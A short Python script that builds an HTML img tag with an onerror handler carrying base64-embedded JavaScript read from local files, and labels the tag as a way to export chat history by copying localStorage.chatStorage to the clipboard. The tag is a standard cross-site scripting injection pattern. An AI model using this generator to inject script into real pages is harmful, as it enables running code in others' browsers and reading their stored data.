from base64 import b64encode

payload = ""
with open("test.html", "rb") as f:
    payload = b64encode(f.read()).decode("utf-8")

with open("test.js", "rb") as f2:
    js_content = f2.read().decode().replace("__PAYLOAD__", payload)

js_content = js_content.replace("\n",";").replace("\"","'")

print("<img src=x onerror=\""+js_content+"\" alt='click pic to export Json Chat history' onclick='navigator.clipboard.writeText(localStorage.chatStorage)'>")
